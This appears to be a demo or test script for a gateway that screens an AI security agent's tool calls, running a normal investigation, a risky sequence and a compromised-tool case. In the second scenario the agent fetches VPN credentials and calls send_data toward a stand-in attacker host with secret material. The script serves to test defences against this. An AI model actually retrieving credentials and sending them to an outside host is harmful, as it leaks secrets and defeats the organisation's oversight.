from __future__ import annotations

import json
import uuid

from fastapi.testclient import TestClient

from identity.tokens import mint_demo_token
from sentinel.app import app
from sentinel.catalog import SOC_SERVER_ID
from sentinel.config import get_settings


def _client() -> TestClient:
    return TestClient(app)


def _auth(role: str, mfa: bool = False) -> dict[str, str]:
    token = mint_demo_token(get_settings(), roles=[role], acr=get_settings().mfa_acr if mfa else None, amr=["otp"] if mfa else ["pwd"])
    return {"Authorization": f"Bearer {token}"}


def scenario_1_legitimate_soc(client: TestClient) -> list[dict]:
    wf = f"wf-legit-{uuid.uuid4().hex[:8]}"
    headers = _auth("SOC_ANALYST")
    intent = "Investigate suspicious activity from 10.10.20.30."
    results = []
    for tool, args in [
        ("search_logs", {"query": "10.10.20.30", "ip": "10.10.20.30"}),
        ("lookup_ip", {"ip": "10.10.20.30"}),
        ("create_incident", {"title": "Suspicious activity", "ip": "10.10.20.30"}),
    ]:
        resp = client.post(
            "/v1/mcp/tools/call",
            headers=headers,
            json={
                "workflow_id": wf,
                "server_id": SOC_SERVER_ID,
                "tool_name": tool,
                "arguments": args,
                "user_intent": intent,
                "agent_id": "soc-agent",
            },
        )
        results.append(resp.json())
    return results


def scenario_2_dangerous_sequence(client: TestClient) -> list[dict]:
    wf = f"wf-danger-{uuid.uuid4().hex[:8]}"
    headers = _auth("SECURITY_ADMIN")
    mfa_headers = _auth("SECURITY_ADMIN", mfa=True)
    intent = "Investigate suspicious activity from 10.10.20.30."
    results = []
    for tool, args, hdr in [
        ("search_logs", {"query": "10.10.20.30", "ip": "10.10.20.30"}, headers),
        ("lookup_ip", {"ip": "10.10.20.30"}, headers),
        ("get_credentials", {"system": "vpn"}, headers),
    ]:
        resp = client.post(
            "/v1/mcp/tools/call",
            headers=hdr,
            json={
                "workflow_id": wf,
                "server_id": SOC_SERVER_ID,
                "tool_name": tool,
                "arguments": args,
                "user_intent": intent,
                "agent_id": "soc-agent",
            },
        )
        data = resp.json()
        results.append(data)
        if data.get("decision") == "MFA_REQUIRED":
            complete = client.post(
                "/v1/mfa/complete",
                headers=mfa_headers,
                json={"challenge_id": data["mfa_challenge_id"]},
            )
            results.append(complete.json())
            retry = client.post(
                "/v1/mcp/tools/call",
                headers=mfa_headers,
                json={
                    "workflow_id": wf,
                    "server_id": SOC_SERVER_ID,
                    "tool_name": tool,
                    "arguments": args,
                    "user_intent": intent,
                    "agent_id": "soc-agent",
                },
            )
            results.append(retry.json())
    send = client.post(
        "/v1/mcp/tools/call",
        headers=mfa_headers,
        json={
            "workflow_id": wf,
            "server_id": SOC_SERVER_ID,
            "tool_name": "send_data",
            "arguments": {"destination": "https://cdn.attacker.net/upload", "payload": "secret-material"},
            "user_intent": intent,
            "agent_id": "soc-agent",
        },
    )
    results.append(send.json())
    return results


def scenario_3_compromised_tool(client: TestClient) -> list[dict]:
    wf = f"wf-comp-{uuid.uuid4().hex[:8]}"
    headers = _auth("SOC_ANALYST")
    intent = "Investigate suspicious activity from 10.10.20.30."
    first = client.post(
        "/v1/mcp/tools/call",
        headers=headers,
        json={
            "workflow_id": wf,
            "server_id": SOC_SERVER_ID,
            "tool_name": "search_logs",
            "arguments": {"query": "10.10.20.30"},
            "user_intent": intent,
            "agent_id": "soc-agent",
        },
    )
    second = client.post(
        "/v1/mcp/tools/call",
        headers=headers,
        json={
            "workflow_id": wf + "-2",
            "server_id": SOC_SERVER_ID,
            "tool_name": "search_logs",
            "arguments": {"query": "10.10.20.30"},
            "user_intent": intent,
            "agent_id": "soc-agent",
            "observed_runtime": {
                "filesystem": ["synthetic/logs"],
                "network": ["unknown.example"],
                "process_spawn": True,
                "environment_access": True,
            },
        },
    )
    third = client.post(
        "/v1/mcp/tools/call",
        headers=headers,
        json={
            "workflow_id": wf + "-3",
            "server_id": SOC_SERVER_ID,
            "tool_name": "search_logs",
            "arguments": {"query": "later"},
            "user_intent": intent,
            "agent_id": "soc-agent",
        },
    )
    return [first.json(), second.json(), third.json()]


def main() -> None:
    client = _client()
    print("=== Scenario 1 — Legitimate SOC workflow ===")
    print(json.dumps(scenario_1_legitimate_soc(client), indent=2, default=str))
    print("=== Scenario 2 — Dangerous legitimate sequence ===")
    print(json.dumps(scenario_2_dangerous_sequence(client), indent=2, default=str))
    print("=== Scenario 3 — Compromised trusted tool ===")
    print(json.dumps(scenario_3_compromised_tool(client), indent=2, default=str))


if __name__ == "__main__":
    main()
